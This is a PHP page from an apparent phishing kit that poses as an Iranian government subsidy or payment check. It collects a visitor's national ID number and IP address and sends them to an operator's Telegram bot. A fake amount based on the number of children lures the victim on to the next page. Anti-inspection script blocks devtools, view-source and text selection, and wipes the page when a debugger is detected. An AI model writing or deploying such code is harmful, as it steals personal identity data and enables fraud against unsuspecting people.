<?php
include_once '../info.php';
$armxan_CM = $_POST["cm"] ?? "";
if(isset($_POST['frznd'])){
    $s = $_POST['frznd'] ?? "";
    if($s == "1"){
        $df = "4,200,000";
    }elseif($s == "2"){
        $df = "4,800,000";
    }elseif($s >= 3){
        $df = "5,500,000";
    }else{
        $df = "3,560,000"; 
    }
}else{
    $df = "3,560,000";
}
function getip(){
    if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])){
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }else{
        return $_SERVER['REMOTE_ADDR'];
    }
}
$ip = getip();


$Text = "  
ɴᴇᴡ #ᴀᴘᴘ ʟᴏɢɪɴ 🩸
<blockquote>ᴘᴏʀᴛ : #ᴇʙʟᴀɢʜ</blockquote>

ᴄᴏᴅᴇ ᴍᴇʟɪ : <code>$armxan_CM</code>
ɪᴘ : <code>$ip</code>

ᴄᴏᴅᴇᴅ ʙʏ : @altoid_ForCode

";

$des = strtr($Text, array(
        '۰' => '0',
        '۱' => '1',
        '۲' => '2',
        '۳' => '3',
        '۴' => '4',
        '۵' => '5',
        '۶' => '6',
        '۷' => '7',
        '۸' => '8',
        '۹' => '9',
        '٠' => '0',
        '١' => '1',
        '٢' => '2',
        '٣' => '3',
        '٤' => '4',
        '٥' => '5',
        '٦' => '6',
        '٧' => '7',
        '٨' => '8',
        '٩' => '9'
    ));

    file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($Text).'&parse_mode=HTML');
?>
<!DOCTYPE html>
<html



<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
<meta charset="utf-8" />
<head>


<body>



<center>
<img src="../IMG/madaret.gif" width="120" height="120">


</center>

<br>
<style>
@font-face {
    font-family: myFont;
    src: url('../Fonts/Shabnam-FD.ttf');
}
body {
    font-family: myFont;
}

  h3 {
   text-align: center;
   color: #000080;
  }
</style>

<center>
     <h3>در حال بررسی شماره ملی   <?php echo $armxan_CM; ?> </h3>
</center>

<meta http-equiv="refresh" content="5; URL=p.php?df=<?php echo $df; ?>">

</head>




<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function(e){
    if(
        e.keyCode === 123 || 
        (e.ctrlKey && e.keyCode === 85) || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
        (e.ctrlKey && e.keyCode === 83)
    ){
        e.preventDefault();
        return false;
    }
});
document.addEventListener('selectstart', e => e.preventDefault());

// basic devtools detect (weak)
setInterval(function(){
    const before = Date.now();
    debugger;
    const after = Date.now();
    if(after - before > 100){
        document.body.innerHTML = "";
    }
}, 2000);
</script>

</html>